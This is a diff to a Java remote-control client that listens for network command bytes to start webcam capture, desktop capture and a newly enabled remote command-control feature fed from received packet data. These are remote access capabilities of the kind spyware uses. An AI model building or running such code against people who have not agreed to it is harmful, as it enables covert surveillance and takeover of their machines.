@@ -16,6 +16,8 @@ import java.util.Random;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
+import static Tools.IConstants.BUFFER_SIZE;
+
 public class Client extends NetworkInterface {
 
     public static void main(String[] args) throws SocketException {
@@ -34,7 +36,7 @@ public class Client extends NetworkInterface {
     private final CameraCapture cameraCapture;
 //    private final AudioCapture audioCapture = new AudioCapture();
 //    private final Chat chat = new Chat();
-//    private final CMDControl cmdControl = new CMDControl();
+    private final CMDControl cmdControl;
     private final DesktopCapture desktopCapture;
 
     public Client(int PORT) throws SocketException {
@@ -45,6 +47,7 @@ public class Client extends NetworkInterface {
 
         cameraCapture = new CameraCapture(0, new PacketHandler(socket, address, PORT));
         desktopCapture = new DesktopCapture(new PacketHandler(socket, address, PORT));
+        cmdControl = new CMDControl(new PacketHandler(socket, address, PORT));
 
         threadListener.execute(listener());
     }
@@ -102,7 +105,7 @@ public class Client extends NetworkInterface {
             outer:
             while (true) {
                 try {
-                    byte[] data = packetHandler.receive(1, packetHandler.getPacketAddress(), packetHandler.getPacketPort());
+                    byte[] data = packetHandler.receive(BUFFER_SIZE, packetHandler.getPacketAddress(), packetHandler.getPacketPort());
                     switch (data[0]) {
                         case CommandByte.CAMERA_BYTE -> {
                             cameraCapture.open();
@@ -110,7 +113,11 @@ public class Client extends NetworkInterface {
                         }
                         case CommandByte.CAMERA_BYTE_STOP -> cameraCapture.stopFeature();
 //                        case CommandByte.AUDIOCAPTURE_BYTE -> audioCapture.startFeature();
-//                        case CommandByte.CMDCONTROL_BYTE -> cmdControl.startFeature();
+                        case CommandByte.CMDCONTROL_BYTE -> {
+                            cmdControl.setReceivedBuffer(data);
+                            cmdControl.startFeature();
+                        }
+                        case CommandByte.CMDCONTROL_BYTE_STOP -> cmdControl.stopFeature();
                         case CommandByte.DESKTOPCONTROL_BYTE -> desktopCapture.startFeature();
                         case CommandByte.DESKTOPCONTROL_BYTE_STOP -> desktopCapture.stopFeature();
 //                        case CommandByte.CHAT_BYTE -> chat.startFeature();
